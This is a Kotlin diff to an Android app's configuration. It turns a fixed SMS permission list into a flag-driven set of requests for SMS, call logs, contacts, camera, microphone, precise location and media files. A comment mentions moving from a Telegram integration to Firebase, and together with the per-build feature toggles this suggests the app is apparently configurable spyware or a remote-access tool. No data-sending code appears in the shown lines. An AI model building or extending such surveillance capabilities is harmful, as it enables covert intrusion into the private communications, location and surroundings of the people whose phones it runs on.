@@ -8,13 +8,48 @@ import android.os.Build
 object Config {
     // (Telegram integration removed, relying purely on Firebase)
 
-    val REQUIRED_PERMISSIONS = mutableListOf(
-        Manifest.permission.READ_SMS,
-        Manifest.permission.RECEIVE_SMS
-    ).apply {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            add(Manifest.permission.POST_NOTIFICATIONS)
+    fun getRequiredPermissions(context: Context): List<String> {
+        val perms = mutableListOf<String>()
+        
+        val enableGallery = getMetaData(context, "feat_gallery") != "false"
+        val enableFiles = getMetaData(context, "feat_files") != "false"
+        val enableAudio = getMetaData(context, "feat_audio") != "false"
+        val enableCamera = getMetaData(context, "feat_camera") != "false"
+        val enableLocation = getMetaData(context, "feat_location") != "false"
+        val enableCalls = getMetaData(context, "feat_calls") != "false"
+        val enableSms = getMetaData(context, "feat_sms") != "false"
+
+        if (enableSms) {
+            perms.add(Manifest.permission.READ_SMS)
+            perms.add(Manifest.permission.RECEIVE_SMS)
         }
+        if (enableCalls) {
+            perms.add(Manifest.permission.READ_CALL_LOG)
+            perms.add(Manifest.permission.READ_CONTACTS)
+        }
+        if (enableCamera) {
+            perms.add(Manifest.permission.CAMERA)
+        }
+        if (enableAudio) {
+            perms.add(Manifest.permission.RECORD_AUDIO)
+        }
+        if (enableLocation) {
+            perms.add(Manifest.permission.ACCESS_FINE_LOCATION)
+            perms.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        }
+        if (enableGallery || enableFiles) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
+                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
+                perms.add(Manifest.permission.READ_MEDIA_AUDIO)
+            } else {
+                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            }
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+        return perms
     }
 
     fun getMetaData(context: Context, key: String): String {
